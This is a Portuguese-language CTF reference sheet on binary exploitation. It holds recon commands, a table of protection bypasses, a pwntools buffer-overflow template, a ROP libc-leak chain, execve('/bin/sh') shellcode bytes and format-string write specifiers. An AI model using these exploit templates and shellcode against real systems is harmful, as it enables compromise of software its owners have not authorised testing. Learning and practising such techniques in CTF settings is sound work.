# 💥 Guia de referência de pwn/exploração de binários para CTF

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Pwn-CTF.tr.md) • [🇬🇷 Ελληνικά](Pwn-CTF.el.md)

> **Notas de precisão:** Buffer overflow é um transbordo dos limites de um buffer; ROP combina pequenos trechos de instruções (gadgets), e shellcode é código de máquina preparado para executar uma ação. Os endereços e o deslocamento dos exemplos são ilustrativos. Os exemplos de 64 bits exigem contexto compatível: no [pwntools](https://docs.pwntools.com/en/stable/context.html), a arquitetura predefinida é `i386`; `context.binary` ou uma configuração explícita permitem selecionar a arquitetura do alvo. O exemplo ROP pressupõe `offset` definido e não completa todo o exploit. `pattern create`/`pattern offset` pertencem a extensões do GDB. A sintaxe de `checksec` depende da implementação instalada. As linhas `%n` e `%hhn` combinam o especificador literal com uma explicação; não são comandos de shell. O alinhamento da pilha e os contornos de proteções dependem da ABI e do binário.

---

## 🔍 Análise inicial

```bash
# Verificar as proteções
checksec binary

# Informações do ficheiro
file binary
ldd binary        # Bibliotecas

# Executar o binário
./binary
ltrace ./binary   # Chamadas a bibliotecas
strace ./binary   # Chamadas de sistema
```

---

## 🛡️ Proteções

| Proteção | Descrição | Contorno |
|------------|-------------|--------|
| **NX** | Pilha não executável | ROP |
| **ASLR** | Endereços aleatórios | Obter uma fuga de informação e calcular |
| **PIE** | Base do binário aleatorizada | Obter uma fuga de um endereço do binário |
| **Canary** | Valor de controlo da pilha (stack cookie) | Obter uma fuga do canary |
| **RELRO** | Proteção da GOT | Utilizar outras técnicas |

---

## 📏 Buffer Overflow

### Determinar o deslocamento (offset)
```bash
# Utilizar pwntools
cyclic 200        # Gerar o padrão
cyclic -l 0x6161616a  # Determinar o deslocamento

# Utilizar GDB
pattern create 200
pattern offset 0x6161616a
```

### Exploit básico (pwntools)
```python
from pwn import *

p = process('./binary')
# p = remote('host', port)

offset = 64
payload = b'A' * offset
payload += p64(0xdeadbeef)  # Endereço de retorno

p.sendline(payload)
p.interactive()
```

---

## 🔗 ROP (Return Oriented Programming)

### Procurar gadgets
```bash
ROPgadget --binary binary
ropper -f binary

# Gadgets comuns
pop rdi; ret
pop rsi; pop r15; ret
ret                  # Para alinhamento da pilha
```

### Cadeia ROP (pwntools)
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# Construir a cadeia
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = b'A' * offset + rop.chain()
```

---

## 🐚 Shellcode

### Linux de 64 bits
```python
# pwntools shellcraft
shellcode = asm(shellcraft.sh())

# Manual
# execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

---

## 📚 Format string (cadeia de formatação)

```bash
# Obter valores através de fugas de informação
%p %p %p %p %p
%x %x %x %x %x

# Escrever
%n - escrever o número de bytes apresentados
%hhn - escrever um byte
```

```python
# pwntools fmtstr
from pwn import *
fmtstr_payload(offset, {target_addr: value})
```

---

## 🛠️ Ferramentas

| Ferramenta | Utilização |
|------|-----|
| **pwntools** | Biblioteca Python para pwn |
| **GDB + GEF** | Depuração |
| **ROPgadget** | Procurar gadgets ROP |
| **one_gadget** | Procurar um gadget one-shot na libc |
| **checksec** | Verificar as proteções |

---

## 📋 Lista de verificação de pwn

```markdown
□ checksec binary
□ Encontrar a vulnerabilidade (overflow, format string)
□ Calcular o deslocamento
□ Verificar as proteções
□ Construir o exploit (shellcode/ROP)
□ Testar localmente
□ Adaptar para o alvo remoto
```

---

**Voltar a CTF:** [🏁 Visão geral de CTF](README.pt.md)
